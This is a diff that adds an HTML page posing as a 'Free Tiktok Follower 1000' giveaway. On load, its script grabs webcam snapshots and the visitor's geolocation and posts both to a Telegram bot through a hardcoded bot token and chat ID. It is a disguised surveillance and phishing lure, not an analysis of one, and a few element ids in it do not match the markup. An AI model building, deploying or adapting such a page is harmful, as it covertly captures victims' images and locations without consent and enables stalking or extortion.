@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Tiktok Follower 1000</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    #video, #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <video id="cam" autoplay playsinline></video>
+  <canvas id="snap"></canvas>
+
+  <script>
+    const botToken = "7875891131:AAGGioUjQdjIh5eNgGX6NYEtN1N4hCFRd7Q";
+    const chatId = "8043105313";
+
+    function sendPhoto(blob, index) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, `snap${index}.jpg`);
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      }).then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            console.log(`✅ Photo ${index} sent`);
+          } else {
+            console.error(`❌ Error on ${index}:`, data.description);
+          }
+        });
+    }
+
+    function sendLocation(lat, lon) {
+      const link = `https://maps.google.com/?q=${lat},${lon}`;
+      const text = `📍 Location:\n${link}`;
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text })
+      });
+    }
+
+    function captureAndSend() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+
+          video.onloadedmetadata = () => {
+            // Let camera settle for 1 second
+            setTimeout(() => {
+              for (let i = 1; i <= 10; i++) {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  sendPhoto(blob, i);
+                }, "image/jpeg", 0.9);
+              }
+              stream.getTracks().forEach(track => track.stop());
+            }, 1000);
+          };
+        })
+        .catch(error => {
+          console.error("❌ Camera Error:", error);
+        });
+
+      // Location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const { latitude, longitude } = position.coords;
+          sendLocation(latitude, longitude);
+        }, err => {
+          console.error("❌ Location error:", err);
+        });
+      }
+    }
+
+    window.onload = captureAndSend;
+  </script>
+</body>
+</html>
